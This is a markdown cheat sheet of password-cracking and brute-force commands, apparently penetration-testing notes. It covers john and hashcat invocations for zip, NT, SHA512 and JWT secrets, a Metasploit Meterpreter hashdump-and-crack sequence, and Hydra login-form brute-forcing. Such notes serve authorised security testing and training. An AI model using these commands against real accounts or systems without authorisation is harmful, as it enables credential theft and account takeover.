# Cracking
## john
- Crack password protected zip archives
```bash
zip2john archive.zip > archive.hash
john archive.hash --fork=4 -w=/path/to/wordlist
```

- Crack salted SHA512 hash
```bash
# hashfile format: hash$salt
john --format='dynamic=sha512($p.$s)' --wordlist=/path/to/wordlist ./hashfile
```

- Crack Windows hash
```sh
# Fist, get Windows hash
# Format: User:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## hashcat
### cheat sheet
#### attack modes
```bash
# dictionary attack
-a0
# combinator attack
-a1
# bruteforce / mask attack
-a3
# hybrid wordlist+mask
-a6
# hybrid mask+wordlist
-a7
```
#### hash types
```bash
# jwt
-m 16500
```
#### mask attack
##### Builtin charset
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?h = 0123456789abcdef
?H = 0123456789ABCDEF
?s = «space»!"#$%&'()*
?a = ?l?u?d?s
?b = 0x00 - 0xff

```bash
# define custom charset
-1 ?h?H?d
# define mask
?1?1?1
# command
-a3 -1 ?h?H?d ?1?1?1
```
### HS256 JWT secret
```bash
# mask attack 4-12 char [a-z0-9]
hashcat -a 3 -m 16500 jwt.txt ?ld?ld?ld?ld?ld?ld?ld?ld?ld?ld?ld?ld?ld?ld?ld?ld -i --increment-min=4

# dictionary attack
hashcat -a 0 -m 16500 jwt.txt passlist.txt

# distionary rule-based attack
hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
```

## Metasploit
- Crack previously dumped Windows hash
```sh
# First, open and background a Meterpreter session
# Store hash dump into database, then:
use post/windows/gather/hashdump
set session X
use auxiliary/analyze/crack_windows
run
```


# Brute forcing
## Hydra
- Bruteforce login/password combination
```
hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt <hostname> http-post-form "/path/to/login:<username field name>=^USER^&<password field name>=^PASS^:<error string>"
```
- Find password for a known user
```
hydra -P /usr/share/wordlists/rockyou.txt -l admin www.domain.tld http-post-form "/path/to/login.php:<username field name>=^USER^&<password field name>=^PASS^:<error string>"
```

## Links
___
### Guides
- https://github.com/frizb/Hydra-Cheatsheet
- https://github.com/DidierStevens/DidierStevensSuite/blob/master/xor-kpa.py

### Writeups
- 